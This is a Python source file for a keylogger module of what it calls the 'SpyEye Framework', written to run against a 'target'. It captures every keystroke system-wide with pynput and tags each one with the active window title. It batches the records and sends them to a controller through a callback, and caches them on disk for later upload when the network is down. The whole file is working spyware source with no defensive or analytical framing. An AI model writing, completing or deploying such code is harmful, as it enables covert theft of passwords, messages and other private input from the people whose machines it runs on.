"""
modules/keylogger.py

Advanced Global Keystroke Logging Module for SpyEye Framework v3.1.
  - Captures universal keystrokes (Windows/Linux/Android-bridges).
  - Smart Buffering & Offline Fallback: Caches logs locally if connection drops.
  - Context Tracking: Logs active window/application names per keystroke.
  - Structured Reporting: Formats outputs into clear 'Keyboard Activity Reports'.
"""

import json
import logging
import os
import threading
import time
from typing import Any, Callable, Dict, List, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class KeyloggerModule(BaseModule):
    """
    Global keystroke logger with advanced buffering, offline persistence, and context awareness.

    Configuration parameters:
        flush_interval (float): Seconds between auto-flushes (default: 20.0)
        buffer_size (int): Max keystrokes before forced flush (default: 50)
        track_window (bool): Capture active focused window title (default: True)
        offline_fallback (bool): Save keystrokes to local disk if network is unreachable (default: True)
        fallback_path (str): File path for offline cached logs (default: "storage/keylogger_cache.json")
    """

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._buffer: List[Dict[str, Any]] = []
        self._buffer_lock = threading.Lock()
        self._flush_timer: Optional[threading.Timer] = None
        self._listener = None
        self._result_callback: Optional[Callable] = None

        # Offline fallback configurations
        self._offline_fallback = self.config.get("offline_fallback", True)
        self._fallback_path = self.config.get("fallback_path", "storage/keylogger_cache.json")
        
        if self._offline_fallback:
            os.makedirs(os.path.dirname(self._fallback_path), exist_ok=True)

    def validate_config(self) -> bool:
        flush_interval = self.config.get("flush_interval", 20.0)
        buffer_size = self.config.get("buffer_size", 50)
        if flush_interval <= 0 or buffer_size <= 0:
            logger.error("[%s] flush_interval and buffer_size must be positive values.", self._module_name)
            return False
        return True

    def set_result_callback(self, callback: Callable) -> None:
        """Inject telemetry callback for real-time reporting."""
        self._result_callback = callback

    def run(self) -> None:
        """Main execution thread for starting the listener and periodic flush routines."""
        flush_interval = float(self.config.get("flush_interval", 20.0))
        buffer_size = int(self.config.get("buffer_size", 50))
        track_window = bool(self.config.get("track_window", True))

        logger.info(
            "[%s] Initializing — flush_interval=%.1fs, buffer_size=%d, track_window=%s, offline_fallback=%s",
            self._module_name, flush_interval, buffer_size, track_window, self._offline_fallback
        )

        # Start periodic flushing mechanism
        self._start_flush_timer(flush_interval)

        try:
            from pynput import keyboard

            def on_press(key) -> bool:
                if self._should_stop():
                    return False

                try:
                    entry = self._build_entry(key, track_window)
                    with self._buffer_lock:
                        self._buffer.append(entry)
                        if len(self._buffer) >= buffer_size:
                            self._flush_buffer()
                except Exception as exc:
                    logger.warning("[%s] Error while parsing pressed key: %s", self._module_name, exc)
                return True

            with keyboard.Listener(on_press=on_press, suppress=False) as self._listener:
                self._listener.join()

        except ImportError:
            logger.error("[%s] Required 'pynput' library is missing. Install via pip.", self._module_name)
            self._emit_error("pynput library missing on target")
        except Exception as exc:
            logger.exception("[%s] Fatal listener exception: %s", self._module_name, exc)
            self._emit_error(f"Keylogger listener error: {exc}")
        finally:
            self._cancel_flush_timer()
            self._flush_buffer()

    def _build_entry(self, key, track_window: bool) -> Dict[str, Any]:
        """Construct structured keystroke metadata with app/window context."""
        char_val = None
        key_name = None
        is_special = False

        try:
            char_val = key.char
        except AttributeError:
            key_name = str(key).replace("Key.", "")
            is_special = True

        entry = {
            "timestamp": time.time(),
            "time_human": time.strftime("%Y-%m-%d %H:%M:%S"),
            "char": char_val,
            "key": key_name,
            "special": is_special,
            "window": self._get_active_window() if track_window else ""
        }
        return entry

    def _get_active_window(self) -> str:
        """Retrieve focused window/application title (Windows OS support)."""
        import sys as _sys
        if not _sys.platform.startswith("win"):
            return "Cross-Platform Context"

        try:
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd) + 1
            buffer = ctypes.create_unicode_buffer(length)
            user32.GetWindowTextW(hwnd, buffer, length)
            return buffer.value if buffer.value else "Unknown Window"
        except Exception:
            return "Unknown Window"

    def _start_flush_timer(self, interval: float) -> None:
        """Initialize periodic background timer for automated batch flushing."""
        self._cancel_flush_timer()

        def _flush_tick():
            if self._should_stop():
                return
            self._flush_buffer()
            if not self._should_stop():
                self._start_flush_timer(interval)

        self._flush_timer = threading.Timer(interval, _flush_tick)
        self._flush_timer.daemon = True
        self._flush_timer.start()

    def _cancel_flush_timer(self) -> None:
        """Safely terminate the active flush timer."""
        if self._flush_timer:
            self._flush_timer.cancel()
            self._flush_timer = None

    def _flush_buffer(self) -> None:
        """Flush accumulated keystroke records to the controller or local offline cache."""
        with self._buffer_lock:
            if not self._buffer:
                return
            batch = self._buffer[:]
            self._buffer.clear()

        # Build readable text preview for the Keyboard Activity Report
        readable_text = "".join(
            (e["char"] if e["char"] else f"[{e['key']}]") for e in batch
        )

        payload = {
            "target_id": self.target_id,
            "module": "keylogger",
            "action": "keystrokes_report",
            "count": len(batch),
            "report_summary": readable_text,
            "keystrokes": batch,
            "timestamp": time.time(),
        }

        if self._result_callback:
            try:
                self._result_callback(payload)
                # If callback succeeds, attempt to flush any pre-existing offline cache
                self._sync_offline_cache()
            except Exception as exc:
                logger.warning("[%s] Network delivery failed. Saving to offline cache: %s", self._module_name, exc)
                if self._offline_fallback:
                    self._save_to_offline_cache(batch)
        else:
            logger.info("[%s] Flushed %d keystrokes: %s", self._module_name, len(batch), readable_text[:100])
            if self._offline_fallback:
                self._save_to_offline_cache(batch)

    def _save_to_offline_cache(self, batch: List[Dict[str, Any]]) -> None:
        """Store keystroke batches locally when internet connectivity is missing."""
        try:
            existing_data = []
            if os.path.exists(self._fallback_path):
                with open(self._fallback_path, "r", encoding="utf-8") as f:
                    existing_data = json.load(f)
            
            existing_data.extend(batch)
            with open(self._fallback_path, "w", encoding="utf-8") as f:
                json.dump(existing_data, f, ensure_ascii=False, indent=2)
        except Exception as exc:
            logger.error("[%s] Failed to write offline cache: %s", self._module_name, exc)

    def _sync_offline_cache(self) -> None:
        """Sync cached offline keystrokes once network connection is re-established."""
        if not os.path.exists(self._fallback_path):
            return

        try:
            with open(self._fallback_path, "r", encoding="utf-8") as f:
                cached_data = json.load(f)

            if cached_data and self._result_callback:
                sync_payload = {
                    "target_id": self.target_id,
                    "module": "keylogger",
                    "action": "offline_sync_report",
                    "count": len(cached_data),
                    "keystrokes": cached_data,
                    "timestamp": time.time(),
                }
                self._result_callback(sync_payload)
                # Clear cache file after successful upload
                os.remove(self._fallback_path)
                logger.info("[%s] Successfully synced %d offline cached keystrokes.", self._module_name, len(cached_data))
        except Exception as exc:
            logger.debug("[%s] Offline cache sync pending: %s", self._module_name, exc)

    def stop(self, timeout: float = 2.0) -> bool:
        """Clean termination of keylogger listener and final flush."""
        logger.info("[%s] Stopping keylogger module...", self._module_name)
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

        self._cancel_flush_timer()
        success = super().stop(timeout)
        self._flush_buffer()
        return success

    def _emit_error(self, message: str) -> None:
        payload = {
            "target_id": self.target_id,
            "module": "keylogger",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)